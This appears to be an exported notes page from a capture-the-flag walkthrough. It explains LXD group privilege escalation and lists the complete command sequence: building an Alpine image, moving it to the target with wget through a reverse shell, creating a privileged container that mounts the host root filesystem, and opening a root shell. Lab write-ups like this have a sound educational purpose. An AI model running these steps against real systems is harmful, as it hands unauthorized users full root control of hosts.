<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux Containers</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux Containers</h1><br/><p></p><p><a href="https://linuxcontainers.org/lxd/introduction/">https://linuxcontainers.org/lxd/introduction/</a></p><p></p><p>LXD is a management API for dealing with LXC containers on Linux systems. It will</p><p>perform tasks for any members of the local lxd group. It does not make an effort to</p><p>match the permissions of the calling user to the function it is asked to perform.</p><p></p><p>Digging a little deeper into LXD and searching for the keywords LXD Exploit on Google reveals the</p><p>following information.</p><p></p><p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p></p><p></p><p>A member of the local “lxd” group can instantly escalate the privileges to root on the</p><p>host operating system. This is irrespective of whether that user has been granted sudo</p><p>rights and does not require them to enter their password. The vulnerability exists even</p><p>with the LXD snap package.</p><p></p><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p><p></p><p></p><p>This is exactly what we need and this HackTricks page describes the whole exploitation process step by step.</p><p>The exploit works by making use of the Alpine image, which is a lightweight Linux distribution based on busy</p><p>box. After this distribution is downloaded and built locally, an HTTP server is used to upload it to the remote</p><p>system. The image is then imported into LXD and it is used to mount the Host file system with root</p><p>privileges.</p><p></p><p>Let&#39;s begin by installing the Go programming language as well as some other required packages.</p><p></p><p>sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools</p><p></p><p>Then we must clone the LXC Distribution Builder and build it.</p><p></p><p>git clone <a href="https://github.com/lxc/distrobuilder">https://github.com/lxc/distrobuilder</a></p><p>cd distrobuilder</p><p>make</p><p></p><p>After the build is complete let&#39;s download the Alpine YAML file and build it.</p><p></p><p>mkdir -p $HOME/ContainerImages/alpine/</p><p>cd $HOME/ContainerImages/alpine/</p><p>wget <a href="https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml">https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml</a></p><p>sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8</p><p></p><p>Once the build is done lxd.tar.xz and rootlet.squashfs will be available in the same folder.</p><p></p><p><img src="images/44-1.png" alt="images/44-1.png" /></p><p></p><p>We will now have to transfer these files to the target system through the usage of a Python HTTP server.</p><p>Run the following command locally on the same folder.</p><p></p><p>python3 -m http.server 8000</p><p></p><p>Then switch back to the reverse shell on the target system and download the files.</p><p></p><p>wget http://{local_IP}:8000/lxd.tar.xz</p><p>wget <a href="http://{local_IP}:8000/rootfs.squashfs">http://{local_IP}:8000/rootfs.squashfs</a></p><p></p><p>Note: As shown previously the local IP can be acquired through the ifconfig command line utility.</p><p>Once the transfer finishes, use the ls command to confirm the files transferred successfully.</p><p></p><p><img src="images/44-2.png" alt="images/44-2.png" /></p><p></p><p>The next step is to import the image using the LXC command-line tool.</p><p></p><p>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine</p><p></p><p>To verify that the image has been successfully imported we can list the LXD images.</p><p></p><p>lxc image list</p><p></p><p><img src="images/44-3.png" alt="images/44-3.png" /></p><p></p><p></p><p>Alpine is correctly shown in the image list. We must now set the security.privileged flag to true, so that</p><p>the container has all of the privileges that the root file system has. We will also mount the root file system</p><p>on the container in the /mnt folder.</p><p></p><p>lxc init alpine privesc -c security.privileged=true</p><p>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</p><p></p><p><img src="images/44-4.png" alt="images/44-4.png" /></p><p></p><p>inally we can start the container and start a root shell inside it.</p><p></p><p>lxc start privesc</p><p>lxc exec privesc /bin/sh</p><p></p><p><img src="images/44-5.png" alt="images/44-5.png" /></p><p></p><p>To access the root flag, we can navigate to the /mnt/root/root folder.</p></div>
</body>
</html>
